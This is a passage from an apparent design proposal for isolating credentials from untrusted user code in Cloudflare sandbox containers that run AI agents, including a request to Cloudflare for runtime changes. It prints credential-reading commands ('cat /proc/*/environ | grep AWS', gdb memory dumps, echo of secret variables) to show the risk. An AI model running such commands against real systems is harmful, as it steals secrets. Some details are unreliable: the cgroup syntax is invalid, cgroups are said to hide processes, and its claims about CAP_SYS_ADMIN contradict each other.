# Create platform-trusted cgroup
mkdir /sys/fs/cgroup/platform-trusted
echo "+cpu +memory +pids" > /sys/fs/cgroup/platform-trusted/cgroup.subtree_control

# Configure isolation
echo "pids.max=100" > /sys/fs/cgroup/platform-trusted/pids.max
echo "memory.max=1G" > /sys/fs/cgroup/platform-trusted/memory.max

# Hide from user cgroup
echo "$$" > /sys/fs/cgroup/platform-trusted/cgroup.procs
```

**Real-World Example:**
```typescript
// What we could do with cgroup delegation:
class CGroupIsolation {
  async createTrustedGroup() {
    // Create isolated cgroup for AI agent
    await cgroup.create('platform-trusted', {
      pids: { max: 50 },
      memory: { max: '512M' },
      cpu: { shares: 1024 },
      // Key feature: process visibility
      hideFromOthers: true  // Other cgroups can't see these processes!
    });
  }
  
  async runInTrustedGroup(command: string) {
    const pid = fork();
    if (pid === 0) {
      // Move to trusted cgroup
      await cgroup.moveTo('platform-trusted');
      
      // Set credentials (only visible in this cgroup)
      process.env.AWS_ACCESS_KEY_ID = getSecret();
      
      // Run command
      exec(command);  // e.g., 'python3 ai_agent.py'
    }
    
    // Processes in 'user' cgroup cannot:
    // - See processes in 'platform-trusted'
    // - Access their resources
    // - Read their environment
  }
}
```

**Why We Need It:** cgroups v2 with delegation would let us create truly isolated groups where platform code (AI agent) and user code cannot see each other.

#### 4. Linux User Namespaces - "The Identity Switcher"

**What it is:** Allows mapping users in the container to different users in the namespace.

**Why We Need It:** Could run AI agent as "root" while user code runs as "nobody", with kernel-enforced permission boundaries.

### What Cloudflare Needs to Change

**Current Container Runtime Config (Hypothetical):**
```yaml
# Cloudflare's current configuration
containers:
  sandbox:
    capabilities:
      drop: ["ALL"]  # Drop all capabilities first
      add: 
        - CAP_CHOWN
        - CAP_NET_BIND_SERVICE
        - CAP_SETUID
        # CAP_SYS_ADMIN is NOT included!
    seccomp:
      profile: "default"  # Default Docker profile
    cgroups:
      version: 1  # or 2 without delegation
      delegation: false
```

**What We Need:**
```yaml
# Required configuration for secure AI agents
containers:
  sandbox:
    capabilities:
      drop: ["ALL"]
      add:
        - CAP_CHOWN
        - CAP_NET_BIND_SERVICE
        - CAP_SETUID
        - CAP_SYS_ADMIN  # ← ADD THIS! For namespace creation
    seccomp:
      profile: "custom"  # ← Custom profile
      rules:
        - block_cross_process_environ_reads
        - restrict_proc_access
    cgroups:
      version: 2
      delegation: true  # ← Enable sub-cgroup creation
    namespaces:
      user: true  # ← Enable user namespace mapping
```

### Why Container Runtime Changes Are Required

**Even though we control the Dockerfile**, the runtime restricts us:

```dockerfile
# In our Dockerfile, we can write:
FROM ubuntu:22.04
RUN apt-get install -y sudo strace gdb
USER root  # We're root!

# But at runtime, Cloudflare's container runtime says:
# "You're root, but without dangerous capabilities"
```

**Runtime Enforcement Example:**
```bash
# How Cloudflare likely runs our container:
docker run \
  --cap-drop=ALL \                      # Remove ALL capabilities
  --cap-add=CHOWN \                     # Add back only safe ones
  --cap-add=NET_BIND_SERVICE \
  --security-opt=no-new-privileges \    # Prevent privilege escalation
  --security-opt=seccomp=default.json \ # Default seccomp profile
  our-container

# Result: We're "root" but can't create namespaces or read other processes' memory
```

## Implementation Roadmap

### Phase 1: Immediate Implementation (Production Ready Today)

Since production environments have CAP_SYS_ADMIN and all necessary capabilities, we can implement complete isolation immediately:

1. **Namespace-Based Isolation**
   - Use `unshare` to create isolated PID/mount/network namespaces
   - Platform code runs in separate namespace with credentials
   - User code runs in clean namespace without access
   
2. **Secure Execution API**
   ```typescript
   // This will work in production today
   async execInNamespace(command: string, credentials: Record<string, string>) {
     const child = spawn('unshare', [
       '--pid', '--mount', '--fork',
       'sh', '-c', command
     ], {
       env: { ...cleanEnv, ...credentials }
     });
     // User code cannot see this process or its environment
     return child;
   }
   ```

3. **Process Hiding via PID Namespaces**
   - Platform processes invisible to user code
   - Complete `/proc` isolation between namespaces
   - No cross-namespace environment reading possible

### Phase 2: SDK Enhancement (1-2 Weeks)

1. **Formalize Namespace API**
   - `createIsolatedContext()` for platform operations
   - `execInPlatformNamespace()` for privileged commands
   - `execInUserNamespace()` for user code

2. **Cgroup Integration**
   - Use available cgroup v2 delegation
   - Create resource limits per namespace
   - Monitor resource usage

3. **Testing and Documentation**
   - Comprehensive security test suite
   - Migration guide for existing users
   - Best practices documentation

### Phase 3: Local Development Support (Optional)

Since local development environments don't have CAP_SYS_ADMIN:

1. **Fallback Mode**
   - Detect capabilities at runtime
   - Use namespace isolation in production
   - Fall back to credential vault in development

2. **Development Warning System**
   - Alert developers about security differences
   - Provide clear documentation about production behavior

## Security Analysis Summary

### Current State
- **Vulnerability:** All env vars accessible to all code
- **Exposure:** Persistent for container lifetime
- **Risk:** High - credentials can be exfiltrated

### With Container Control (What We Can Build)
- **Vulnerability:** Brief exposure during execution
- **Exposure:** Milliseconds to seconds
- **Risk:** Medium - timing attacks possible

### With Platform Support (Future State)
- **Vulnerability:** None - complete isolation
- **Exposure:** Zero - different namespaces
- **Risk:** Low - kernel-enforced boundaries

## Concrete Examples: What We Can't Do Today vs Tomorrow

### Scenario: AI Agent Needs to Deploy to AWS

#### What Happens Today (No Isolation)
```python
# ai_agent.py running in container
import os
import subprocess

def deploy_lambda():
    # Option 1: Set credentials in environment (EXPOSED TO ALL!)
    os.environ['AWS_ACCESS_KEY_ID'] = get_from_vault()
    os.environ['AWS_SECRET_ACCESS_KEY'] = get_secret()
    
    # Now user code can steal them:
    # User runs: print(os.environ['AWS_ACCESS_KEY_ID'])
    # Result: "AKIAIOSFODNN7EXAMPLE" <- LEAKED!
    
    # Option 2: Don't set credentials (DEPLOYMENT FAILS!)
    result = subprocess.run(['aws', 'lambda', 'deploy'])
    # Result: "Unable to locate credentials" <- BROKEN!
```

**Reality Check:**
```bash
# Any user code can do this TODAY:
$ cat /proc/*/environ | grep AWS
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE  # Found it!

$ ps aux | grep python
root 1234 python3 ai_agent.py  # Can see AI agent

$ gdb -p 1234
(gdb) dump memory  # Can read AI agent's memory!
```

#### What We Could Do With Platform Support
```python
# ai_agent.py running in isolated namespace
import os
import subprocess

def deploy_lambda():
    # Credentials exist ONLY in AI agent's namespace
    # User code literally cannot see them
    result = subprocess.run(['aws', 'lambda', 'deploy'])
    # Result: SUCCESS!
    
    # Meanwhile, user code in different namespace:
    # print(os.environ.get('AWS_ACCESS_KEY_ID'))  # None
    # subprocess.run(['cat', '/proc/1234/environ'])  # Permission denied
    # subprocess.run(['ps', 'aux'])  # Doesn't even see AI agent!
```

**With Proper Isolation:**
```bash
# User code attempts to steal credentials:
$ cat /proc/*/environ | grep AWS
# (empty - can't see AI agent's namespace)

$ ps aux
PID  USER  COMMAND
5678 user  python3 user_code.py  # Only sees own processes!

$ ls /proc/
5678/  self/  # AI agent's PID not even visible!

$ gdb -p 1234
gdb: No such process  # Can't debug what you can't see!
```

### The Difference in Security Models

#### Today: Time-Based Security (Best We Can Do)
```typescript
// Brief exposure window - credentials visible for seconds
async function deployWithTempCreds() {
  // Credentials exposed for 30 seconds
  await sandbox.setEnvVars({ AWS_KEY: secret });
  await sandbox.exec('aws lambda deploy');
  // Still exposed until container restarts!
  
  // User code within those 30 seconds:
  await sandbox.exec('echo $AWS_KEY');  // Gotcha!
}
```

#### Tomorrow: Isolation-Based Security (What We Need)
```typescript
// Complete isolation - credentials never visible to user code
async function deployWithIsolation() {
  await sandbox.runInNamespace('platform', async () => {
    // Only exists in platform namespace
    process.env.AWS_KEY = secret;
    await exec('aws lambda deploy');
  });
  
  // User code at ANY time:
  await sandbox.exec('echo $AWS_KEY');  // undefined
  await sandbox.exec('ps aux | grep aws');  // No results
}
```

## The Bottom Line

**Today:** We can achieve "good enough" security with our container control:
- In-memory credential vault
- Just-in-time injection  
- Process hiding (limited)
- Audit logging
- **Risk**: Brief exposure windows (seconds)

**Tomorrow:** With platform support, we can achieve "bank-grade" security:
- Complete process isolation
- Kernel-enforced boundaries
- No exposure window
- **Risk**: Near zero

**Key Insight:** 
- Current state: Persistent exposure (hours/days) ❌
- Our solution: Brief exposure (seconds) ⚠️
- With platform support: No exposure (isolated) ✅

Time-based security (brief exposure) << Isolation-based security (no exposure)

But time-based security >> Current state (persistent exposure)

## Concrete Example: AI Code Generation Platform

### The Scenario
You're building "CodeGenie" - an AI-powered platform where users can prompt AI to build full applications.

### Current (Vulnerable) Implementation
```typescript
// Worker code - THIS IS INSECURE
export default {
  async fetch(request: Request, env: Env) {
    const { prompt } = await request.json();
    const sandbox = getSandbox(env.Sandbox, userId);
    
    // DANGER: Setting platform secrets
    await sandbox.setEnvVars({
      R2_ACCESS_KEY: env.R2_ACCESS_KEY,        // For fetching templates
      OPENAI_API_KEY: env.OPENAI_API_KEY,      // For AI features
      DATABASE_URL: env.DATABASE_URL,          // For storing projects
      STRIPE_SECRET_KEY: env.STRIPE_SECRET_KEY // For billing
    });
    
    // User/AI can now steal ALL these secrets!
    const aiResponse = await generateCode(prompt);
    await sandbox.exec(aiResponse.code);
    
    // If AI generates: console.log(process.env)
    // ALL secrets are exposed!
  }
}
```

### Attack Example
User prompt: "Create a Node.js app that shows system information"

AI innocently generates:
```javascript
// app.js - AI generated code
const express = require('express');
const app = express();

app.get('/info', (req, res) => {
  res.json({
    platform: process.platform,
    memory: process.memoryUsage(),
    environment: process.env  // EXPOSES ALL SECRETS!
  });
});

app.listen(3000);
```

### Proposed Secure Implementation Using RPC Callbacks

```typescript
// Worker code - Secrets stay here
export default {
  async fetch(request: Request, env: Env) {
    const { prompt } = await request.json();
    const sandbox = getSandbox(env.Sandbox, userId);
    
    // Leverage Cloudflare RPC callback capability!
    // DO can call back to Worker functions
    await sandbox.registerPlatformCallback(async (op, params) => {
      // This runs in Worker context with access to secrets
      switch(op) {
        case 'fetch-template':
          return await env.R2.get(params.templateId);
        
        case 'save-project':
          return await env.DB.prepare('INSERT INTO projects...').run(params);
        
        case 'deploy-aws':
          // Use AWS SDK with real credentials in Worker
          const lambda = new AWS.Lambda({
            accessKeyId: env.AWS_ACCESS_KEY,
            secretAccessKey: env.AWS_SECRET
          });
          return await lambda.updateFunctionCode(params).promise();
      }
    });
    
    // User code runs without any platform secrets
    const aiResponse = await generateCode(prompt);
    await sandbox.exec(aiResponse.code);
  }
}
```

### Real-World Impact

#### Without Fix
- Users can steal platform API keys
- Potential for massive bills (OpenAI, Stripe)
- Data breaches (database access)
- Platform reputation damage

#### With Fix
- Platform secrets completely isolated
- User code runs in clean environment
- Platform maintains control over privileged operations
- Clear security boundary

## The Ask to Cloudflare (Business Case)

### What We're Building
Platforms where AI agents autonomously execute operations requiring real credentials:
- Deploy code to AWS/GCP/Azure
- Run database migrations
- Execute terraform plans
- Manage Kubernetes clusters
- Integrate with third-party APIs

### The Problem
These tools (AWS CLI, terraform, kubectl) **cannot be modified** to use custom auth. They need standard environment variables or config files. Currently, this means exposing platform secrets to all container code, including untrusted user code.

### What We Need
Enable Linux security capabilities in the container runtime to create isolated execution contexts within containers. This is not about what software we install (Dockerfile) but about what the runtime allows us to do.

### Business Impact

**Without These Changes:**
- Platform developers must choose between:
  - Supporting critical tools (AWS CLI) with security risk
  - Perfect security but breaking essential functionality
- Limits adoption of Cloudflare Containers for AI platforms
- Forces workarounds that increase complexity

**With These Changes:**
- Cloudflare Containers become the ideal platform for AI agents
- Enables secure autonomous operations
- Opens new market opportunities in AI-powered DevOps

### Technical Requirements
```yaml
# Container runtime configuration needed:
containers:
  sandbox:
    capabilities:
      add: [CAP_SYS_ADMIN]  # For namespace creation
    seccomp:
      profile: custom       # For blocking cross-process reads
    cgroups:
      version: 2
      delegation: true      # For process group isolation
```

### Next Steps
1. Evaluate security implications of enabling these capabilities
2. Consider opt-in model for enhanced security features
3. Pilot program with key customers building AI platforms

---

*This document will be updated as we implement and test the proposed solutions.*